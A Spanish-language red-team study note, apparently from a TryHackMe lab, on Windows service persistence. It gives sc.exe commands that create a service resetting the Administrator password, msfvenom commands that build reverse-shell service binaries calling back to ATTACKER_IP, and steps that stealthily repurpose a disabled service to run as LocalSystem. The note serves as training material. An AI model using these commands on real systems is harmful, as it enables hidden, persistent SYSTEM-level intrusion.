---
tags: [red-team, persistence, windows, services]
created: 2026-04-20
source: TryHackMe - Windows Local Persistence
related:
  - "[[Abusing Scheduled Tasks]]"
  - "[[Tampering With Unprivileged Accounts]]"
---

Los servicios de Windows son ideales para persistencia ya que pueden configurarse para ejecutarse en segundo plano cada vez que la máquina arranca.

---

## Crear servicios backdoor

### Método simple: resetear contraseña

```shell
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start THMservice
```

> [!warning] Debe haber un **espacio después de cada `=`** para que el comando funcione.

### Método con reverse shell

Generar un ejecutable compatible con servicios de Windows usando el formato `exe-service`:

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
```

Copiar al target y crear el servicio:

```shell
sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice2
```

> [!info] Los ejecutables de servicios requieren implementar un protocolo específico. El formato `exe-service` de msfvenom se encarga de esto.

---

## Modificar servicios existentes

Crear servicios nuevos puede ser detectado. Es más sigiloso reusar un **servicio deshabilitado** existente.

Listar servicios:

```shell
sc.exe query state=all
```

Consultar configuración de un servicio:

```shell
sc.exe qc THMService3
```

### Tres propiedades clave

| Propiedad | Objetivo |
|-----------|----------|
| `BINARY_PATH_NAME` | Apuntar a nuestro payload |
| `START_TYPE` | `AUTO_START` para ejecución automática |
| `SERVICE_START_NAME` | `LocalSystem` para privilegios SYSTEM |

### Reconfigurar el servicio

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
```

```shell
sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
```

Verificar:

```shell
sc.exe qc THMservice3
```
